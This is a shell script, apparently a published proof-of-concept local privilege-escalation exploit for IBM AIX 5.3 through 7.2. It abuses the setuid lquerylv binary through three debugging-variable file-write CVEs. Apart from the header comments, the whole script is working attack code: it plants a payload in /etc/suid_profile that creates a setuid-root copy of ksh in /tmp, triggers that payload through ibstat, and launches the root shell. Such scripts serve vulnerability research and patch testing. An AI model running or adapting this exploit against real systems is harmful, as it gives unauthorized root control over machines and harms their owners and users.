#!/usr/bin/sh
#
# AIX lquerylv 5.3, 6.1, 7.1, 7.2 local root exploit. Tested against latest patchset (7100-04)
#
# This exploit takes advantage of known issues with debugging functions
# within the AIX linker library. We are taking advantage of known
# functionality, and focusing on badly coded SUID binaries which do not
# adhere to proper security checks prior to seteuid/open/writes.
#
# The CVEs we will be taking advantage of:
# - CVE-2009-1786: The malloc subsystem in libc in IBM AIX 5.3 and 6.1 allows
#   local users to create or overwrite arbitrary files via a symlink attack on
#   the log file associated with the MALLOCDEBUG environment variable.
#
# - CVE-2009-2669: A certain debugging component in IBM AIX 5.3 and 6.1 does
#   not properly handle the (1) _LIB_INIT_DBG and (2) _LIB_INIT_DBG_FILE
#   environment variables, which allows local users to gain privileges by
#   leveraging a setuid-root program to create an arbitrary root-owned file
#   with world-writable permissions, related to libC.a (aka the XL C++ runtime
#   library) in AIX 5.3 and libc.a in AIX 6.1.
#
# - CVE-2014-3074: Runtime Linker Allows Privilege Escalation Via Arbitrary
#   File Writes In IBM AIX.
#
# In each instance of the aforementioned CVEs, IBM merely patched the binaries
# which were reported in the original reports as being used for escalation of
# the vulnerabilities. This allowed for the lquerylv binary to slip by their
# patches and become an attack vector.
#
# Blog post URL: https://rhinosecuritylabs.com/2016/11/03/unix-nostalgia-hunting-zeroday-vulnerabilities-ibm-aix/
#
# lqueryroot.sh by @hxmonsegur [2016 //RSL]

ROOTSHELL=/tmp/shell-$(od -N4 -tu /dev/random | awk 'NR==1 {print $2} {}')
APP=$0

function usage
{
    echo "Usage: $APP [1] | [2] | [3]"
    echo
    echo "1 - MALLOCDEBUG file write -> escalation"
    echo "2 - _LIB_INIT_DBG_FILE file write -> escalation"
    echo "3 - MALLOCBUCKETS file write -> escalation"
    echo
    echo "[lquerylv] AIX 5.3/6.1/7.1/7.2 Privilege escalation by @hxmonsegur //RSL"
    exit
}

function CVE20091786
{
    echo "[*] Exporting MALLOCDEBUG environment variable"
    MALLOCTYPE=debug
    MALLOCDEBUG=report_allocations,output:/etc/suid_profile
    export MALLOCTYPE MALLOCDEBUG
}

function CVE20092669
{
    echo "[*] Exporting _LIB_INIT_DBG_FILE environment variable"
    _LIB_INIT_DBG=1
    _LIB_INIT_DBG_FILE=/etc/suid_profile
    export _LIB_INIT_DBG _LIB_INIT_DBG_FILE
}

function CVE20143074
{
    echo "[*] Exporting MALLOCBUCKETS environment variable"
    MALLOCOPTIONS=buckets
    MALLOCBUCKETS=number_of_buckets:8,bucket_statistics:/etc/suid_profile
    export MALLOCOPTIONS MALLOCBUCKETS
}

if [ -z "$1" ]; then
    usage
    exit 1
fi

while [ "$1" != "" ]; do
    case $1 in
        1 )    CVE20091786;;
        2 )    CVE20092669;;
        3 )    CVE20143074;;
        * )    usage
               break;;
    esac
    shift
done

if [ ! -x "/usr/sbin/lquerylv" ]; then
    echo "[-] lquerylv isn't executable. Tough luck."
    exit 1
fi

echo "[*] Setting umask to 000"
umask 000

echo "[*] Execute our vulnerable binary"
/usr/sbin/lquerylv >/dev/null 2>&1

if [ ! -e "/etc/suid_profile" ]; then
    echo "[-] /etc/suid_profile does not exist and exploit failed."
    exit 1
fi

echo "[*] Cleaning up /etc/suid_profile"
echo > /etc/suid_profile

echo "[*] Current id: `/usr/bin/id`"

echo "[*] Adding payload"
cat << EOF >/etc/suid_profile
cp /bin/ksh $ROOTSHELL
/usr/bin/syscall setreuid 0 0
chown root:system $ROOTSHELL
chmod 6755 $ROOTSHELL
rm /etc/suid_profile
EOF

echo "[*] Unsetting env"
unset MALLOCBUCKETS MALLOCOPTIONS _LIB_INIT_DBG_FILE _LIB_INIT_DBG MALLOCDEBUG MALLOCTYPE

echo "[*] Executing ibstat for fun and profit"
/usr/bin/ibstat -a >/dev/null 2>&1

if [ ! -e "$ROOTSHELL" ]; then
    echo "[-] Rootshell does not exist and exploit failed."
    exit 1
fi

echo "[*] Executing rootshell"
$ROOTSHELL